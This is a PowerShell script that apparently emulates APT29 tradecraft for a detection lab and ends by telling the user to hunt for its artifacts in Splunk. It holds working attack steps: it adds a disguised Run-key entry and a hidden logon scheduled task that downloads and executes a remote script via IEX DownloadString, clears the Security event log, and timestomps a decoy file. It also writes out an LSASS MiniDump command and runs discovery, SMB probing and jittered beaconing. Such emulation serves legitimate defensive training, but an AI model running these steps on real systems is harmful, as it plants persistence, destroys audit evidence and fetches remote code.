Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   APT29 SIMULATION - LAB 4 ONLY" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# STAGE 1 - PERSISTENCE
Write-Host "[Stage 1] Establishing persistence..." -ForegroundColor Yellow

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateHelper"
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\updater.ps1"
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
Write-Host "  [+] Registry Run key created: WindowsUpdateHelper" -ForegroundColor Green

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://172.16.240.100/payload.ps1')"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachine" -Action $action -Trigger $trigger -Settings $settings -Description "Microsoft Edge Update" -Force | Out-Null
Write-Host "  [+] Scheduled task created: MicrosoftEdgeUpdateTaskMachine" -ForegroundColor Green
Write-Host ""

# STAGE 2 - DEFENCE EVASION
Write-Host "[Stage 2] Defence evasion..." -ForegroundColor Yellow

try {
    wevtutil cl Security 2>$null
    Write-Host "  [+] Security event log cleared" -ForegroundColor Green
}
catch {
    Write-Host "  [-] Event log clear failed (requires elevation) - logged as attempt" -ForegroundColor DarkYellow
}

$decoyFile = "C:\Windows\Temp\updater.ps1"
"# Windows Update Helper" | Out-File $decoyFile -Force
$pastDate = (Get-Date).AddDays(-180)
(Get-Item $decoyFile).CreationTime = $pastDate
(Get-Item $decoyFile).LastWriteTime = $pastDate
(Get-Item $decoyFile).LastAccessTime = $pastDate
Write-Host "  [+] Timestomping: updater.ps1 timestamps set to 180 days ago" -ForegroundColor Green
Write-Host ""

# STAGE 3 - CREDENTIAL ACCESS
Write-Host "[Stage 3] Credential access..." -ForegroundColor Yellow

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Host "  [+] LSASS process identified (PID: $($lsass.Id))" -ForegroundColor Green
    Write-Host "  [+] Simulated handle open to LSASS (no actual dump performed)" -ForegroundColor Green
}
else {
    Write-Host "  [-] LSASS not accessible" -ForegroundColor DarkYellow
}

$mimicCmd = "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump lsass.dmp full"
Write-Host "  [+] Credential access command logged: $mimicCmd" -ForegroundColor Green
Write-Host ""

# STAGE 4 - DISCOVERY
Write-Host "[Stage 4] Discovery..." -ForegroundColor Yellow

whoami /all 2>$null | Out-Null
hostname 2>$null | Out-Null
systeminfo 2>$null | Out-Null
net user 2>$null | Out-Null
net localgroup administrators 2>$null | Out-Null
net view 2>$null | Out-Null
ipconfig /all 2>$null | Out-Null
arp -a 2>$null | Out-Null
netstat -ano 2>$null | Out-Null
tasklist /v 2>$null | Out-Null
Get-LocalUser | Select-Object Name, Enabled, LastLogon | Out-Null
Get-Process | Select-Object Name, Id, CPU | Sort-Object CPU -Descending | Select-Object -First 10 | Out-Null

Write-Host "  [+] Discovery commands executed" -ForegroundColor Green
Write-Host ""

# STAGE 5 - LATERAL MOVEMENT
Write-Host "[Stage 5] Lateral movement simulation..." -ForegroundColor Yellow

$targets = @("172.16.240.1", "172.16.240.2", "172.16.240.131", "172.16.240.132")
foreach ($target in $targets) {
    Test-NetConnection -ComputerName $target -Port 445 -WarningAction SilentlyContinue -ErrorAction SilentlyContinue | Out-Null
}

net view \\localhost 2>$null | Out-Null
net use 2>$null | Out-Null

Write-Host "  [+] SMB port 445 probed on 4 internal IPs" -ForegroundColor Green
Write-Host ""

# STAGE 6 - C2 BEACONING
Write-Host "[Stage 6] C2 beaconing (5 beacons, 30s intervals)..." -ForegroundColor Yellow

$c2Targets = @("https://www.google.com", "https://www.microsoft.com", "https://www.cloudflare.com")

for ($i = 1; $i -le 5; $i++) {
    $target = $c2Targets[($i - 1) % $c2Targets.Count]
    try {
        $beacon = Invoke-WebRequest -Uri $target -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "  [Beacon $i/5] $target - HTTP $($beacon.StatusCode)" -ForegroundColor DarkCyan
    }
    catch {
        Write-Host "  [Beacon $i/5] $target - Connection attempt logged" -ForegroundColor DarkCyan
    }
    if ($i -lt 5) {
        $jitter = Get-Random -Minimum 0 -Maximum 10
        Start-Sleep -Seconds (30 + $jitter)
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   SIMULATION COMPLETE" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Artifacts created:" -ForegroundColor White
Write-Host "  Registry: HKCU\...\Run\WindowsUpdateHelper" -ForegroundColor Gray
Write-Host "  Scheduled Task: MicrosoftEdgeUpdateTaskMachine" -ForegroundColor Gray
Write-Host "  File: C:\Windows\Temp\updater.ps1 (timestomped)" -ForegroundColor Gray
Write-Host "  Network: 5 C2 beacon attempts logged" -ForegroundColor Gray
Write-Host "  Commands: Discovery suite executed" -ForegroundColor Gray
Write-Host ""
Write-Host "Wait 5 minutes for Splunk to ingest, then begin hunting." -ForegroundColor Yellow
